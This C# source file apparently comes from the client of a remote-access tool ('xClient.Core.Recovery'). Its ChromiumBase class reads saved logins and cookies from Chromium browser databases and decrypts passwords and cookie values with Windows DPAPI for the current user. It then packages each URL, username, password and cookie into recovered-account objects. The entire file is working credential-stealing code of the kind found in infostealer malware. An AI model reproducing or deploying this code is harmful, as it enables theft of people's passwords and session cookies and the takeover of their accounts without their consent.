using System;
using System.Collections.Generic;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using xClient.Core.Data;
using xClient.Core.Utilities;

namespace xClient.Core.Recovery.Utilities
{
    public class ChromiumBase
    {
        public static List<RecoveredAccount> Passwords(string datapath, string browser)
        {
            List<RecoveredAccount> data = new List<RecoveredAccount>();
            SQLiteHandler SQLDatabase = null;

            if (!File.Exists(datapath))
                return data;

            try
            {
                SQLDatabase = new SQLiteHandler(datapath);
            }
            catch (Exception)
            {
                return data;
            }

            if (!SQLDatabase.ReadTable("logins"))
                return data;

            string host;
            string user;
            string pass;
            int totalEntries = SQLDatabase.GetRowCount();

            for (int i = 0; i < totalEntries; i++)
            {
                try
                {
                    host = SQLDatabase.GetValue(i, "origin_url");
                    user = SQLDatabase.GetValue(i, "username_value");
                    pass = Decrypt(SQLDatabase.GetValue(i, "password_value"));

                    if (!String.IsNullOrEmpty(host) && !String.IsNullOrEmpty(user) && pass != null)
                    {
                        data.Add(new RecoveredAccount
                        {
                            URL = host,
                            Username = user,
                            Password = pass,
                            Application = browser
                        });
                    }
                }
                catch (Exception)
                {
                    // TODO: Exception handling
                }
            }

            return data;
        }
        public static List<ChromiumCookie> Cookies(string dataPath, string browser)
        {
            string datapath = dataPath;

            List<ChromiumCookie> data = new List<ChromiumCookie>();
            SQLiteHandler SQLDatabase = null;

            if (!File.Exists(datapath))
                return data;
            try
            {
                SQLDatabase = new SQLiteHandler(datapath);
            }
            catch (Exception)
            {
                return data;
            }

            if (!SQLDatabase.ReadTable("cookies"))
                return data;

            string host;
            string name;
            string value;
            string path;
            string expires;
            string lastaccess;
            bool secure;
            bool http;
            bool expired;
            bool persistent;
            bool priority;

            int totalEntries = SQLDatabase.GetRowCount();

            for (int i = 0; i < totalEntries; i++)
            {
                try
                {
                    host = SQLDatabase.GetValue(i, "host_key");
                    name = SQLDatabase.GetValue(i, "name");
                    value = Decrypt(SQLDatabase.GetValue(i, "encrypted_value"));
                    path = SQLDatabase.GetValue(i, "path");
                    expires = SQLDatabase.GetValue(i, "expires_utc");
                    lastaccess = SQLDatabase.GetValue(i, "last_access_utc");

                    secure = SQLDatabase.GetValue(i, "secure") == "1";
                    http = SQLDatabase.GetValue(i, "httponly") == "1";
                    expired = SQLDatabase.GetValue(i, "has_expired") == "1";
                    persistent = SQLDatabase.GetValue(i, "persistent") == "1";
                    priority = SQLDatabase.GetValue(i, "priority") == "1";


                    if (!String.IsNullOrEmpty(host) && !String.IsNullOrEmpty(name) && !String.IsNullOrEmpty(value))
                    {
                        data.Add(new ChromiumCookie
                        {
                            HostKey = host,
                            Name = name,
                            Value = value,
                            Path = path,
                            ExpiresUTC = expires,
                            LastAccessUTC = lastaccess,
                            Secure = secure,
                            HttpOnly = http,
                            Expired = expired,
                            Persistent = persistent,
                            Priority = priority,
                            Browser = browser

                        });
                    }
                }
                catch (Exception)
                {

                }
            }

            return data;
        }
        private static string Decrypt(string EncryptedData)
        {
            if (EncryptedData == null || EncryptedData.Length == 0)
            {
                return null;
            }
            byte[] decryptedData = ProtectedData.Unprotect(System.Text.Encoding.Default.GetBytes(EncryptedData), null, DataProtectionScope.CurrentUser);
            return Encoding.UTF8.GetString(decryptedData);
        }
        public class ChromiumCookie
        {
            public string HostKey { get; set; }
            public string Name { get; set; }
            public string Value { get; set; }
            public string Path { get; set; }
            public string ExpiresUTC { get; set; }
            public string LastAccessUTC { get; set; }
            public bool Secure { get; set; }
            public bool HttpOnly { get; set; }
            public bool Expired { get; set; }
            public bool Persistent { get; set; }
            public bool Priority { get; set; }
            public string Browser { get; set; }
            public override string ToString()
            {
                return String.Format("Domain: {1}{0}Cookie Name: {2}{0}Value: {3}{0}Path: {4}{0}Expired: {5}{0}HttpOnly: {6}{0}Secure: {7}", Environment.NewLine, HostKey, Name, Value, Path, Expired, HttpOnly, Secure);
            }
        }
    }
}
